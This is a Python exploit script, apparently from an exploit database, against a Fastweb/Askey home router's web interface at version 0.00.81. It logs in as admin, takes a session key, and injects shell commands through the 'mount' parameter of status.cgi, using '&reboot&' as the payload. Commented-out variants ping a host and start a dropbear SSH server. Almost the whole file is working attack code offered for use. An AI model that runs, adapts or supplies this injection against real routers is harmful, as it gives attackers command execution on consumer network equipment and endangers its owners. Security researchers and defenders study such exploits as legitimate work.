# Date: 2019-11-13
# Exploit Author: Riccardo Gasparini
# Vendor Homepage: https://www.fastweb.it/
# Software Link: http://59.0.121.191:8080/ACS-server/file/0.00.81_FW_200_Askey (only from Fastweb ISP network)
# Version: 0.00.81
# Tested on: Linux
# CVE : N/A

import requests, json, time, sys

current_milli_time = lambda: int(round(time.time() * 1000))

password=&#039;XXXXXXXXXXXXXXX&#039;

if password == &#039;XXXXXXXXXXXXXXX&#039;:
    print("Password is set to XXXXXXXXXXXXXXX\nOpen the script and change the password")
    sys.exit(-1)

#get XSRF-TOKEN
headers = {
    &#039;User-Agent&#039;: &#039;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36&#039;,
    &#039;Referer&#039;: &#039;http://192.168.1.254/tr069&#039;,
}
params = ()
response = requests.get(&#039;http://192.168.1.254&#039;, headers=headers)

#login request and get sessionKey
xsrfToken=response.cookies[&#039;XSRF-TOKEN&#039;]
cookies = {
    &#039;XSRF-TOKEN&#039;: xsrfToken,
}
headers = {
    &#039;Pragma&#039;: &#039;no-cache&#039;,
    &#039;X-XSRF-TOKEN&#039;: xsrfToken,
    &#039;Accept-Language&#039;: &#039;en-US,en-GB;q=0.9,en;q=0.8,it-IT;q=0.7,it;q=0.6,es;q=0.5,de;q=0.4&#039;,
    &#039;User-Agent&#039;: &#039;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36&#039;,
    &#039;Accept&#039;: &#039;application/json, text/plain, */*&#039;,
    &#039;Referer&#039;: &#039;http://192.168.1.254/tr069&#039;,
    &#039;Accept-Encoding&#039;: &#039;gzip, deflate&#039;,
    &#039;Connection&#039;: &#039;keep-alive&#039;,
    &#039;Cache-Control&#039;: &#039;no-cache&#039;,
}
params = (
    (&#039;_&#039;, str(current_milli_time())),
    (&#039;cmd&#039;, &#039;3&#039;),
    (&#039;nvget&#039;, &#039;login_confirm&#039;),
    (&#039;password&#039;, password),
    (&#039;remember_me&#039;, &#039;1&#039;),
    (&#039;sessionKey&#039;, &#039;NULL&#039;),
    (&#039;username&#039;, &#039;admin&#039;),
)

response = requests.get(&#039;http://192.168.1.254/status.cgi&#039;, headers=headers, params=params, cookies=cookies)

jsonResponse = json.loads(response.text)
sessionKey=jsonResponse["login_confirm"]["check_session"]

print("Executing command reboot\n")

#some commands as example are shown below in the mount parameter
params = (
    (&#039;_&#039;, str(current_milli_time())),
    (&#039;act&#039;,&#039;nvset&#039;),
    (&#039;service&#039;,&#039;usb_remove&#039;),
    #Code execution
    #(&#039;mount&#039;,&#039;&ping -c 10 192.168.1.172&&#039;),
    #(&#039;mount&#039;,&#039;&dropbear -r /etc/dropbear/dropbear_rsa_host_key&&#039;),#to enable SSH
    (&#039;mount&#039;,&#039;&reboot&&#039;),
    (&#039;sessionKey&#039;, sessionKey),
)
response = requests.get(&#039;http://192.168.1.254/status.cgi&#039;, headers=headers, params=params, cookies=cookies)
print(response.text)

#logout
params = (
    (&#039;_&#039;, str(current_milli_time())),
    (&#039;cmd&#039;, &#039;5&#039;),
    (&#039;nvget&#039;, &#039;login_confirm&#039;),
    (&#039;sessionKey&#039;, sessionKey),
)

response = requests.get(&#039;http://192.168.1.254/status.cgi&#039;, headers=headers, params=params, cookies=cookies)
print(json.dumps(json.loads(response.text), indent=2))

